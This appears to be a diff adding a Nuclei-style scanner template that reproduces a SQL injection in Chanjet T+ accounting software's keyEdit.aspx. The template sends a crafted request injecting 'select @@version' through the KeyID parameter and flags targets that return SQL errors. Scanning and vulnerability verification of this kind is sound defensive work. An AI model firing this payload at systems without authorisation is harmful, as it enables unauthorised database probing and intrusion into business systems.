@@ -1,0 +1,31 @@
+id: yongyouOA-keyEdit-aspx-sql
+
+info:
+  name: 畅捷通T+ keyEdit.aspx SQL漏洞复现
+  author: cnaq  
+  severity: high 
+  description: 畅捷通T+ keyEdit.aspx SQL漏洞复现
+  reference: 
+    - https://blog.csdn.net/qq_39894062/article/details/138564705
+  tags: yongyou,sql,injection 
+
+requests:
+  - raw:
+      - |
+        GET /tplus/UFAQD/keyEdit.aspx?KeyID=1%27%20and%201=(select%20@@version)%20--&preload=1 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Linux; Android 11; motorola edge 20 fusion) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.61 Mobile Safari/537.36
+        Accept-Charset: utf-8
+        Accept-Encoding: gzip, deflate
+        Connection: close
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: header
+        words:
+          - '200'
+      - type: regex
+        part: body
+        regex:
+          - 'SQL'
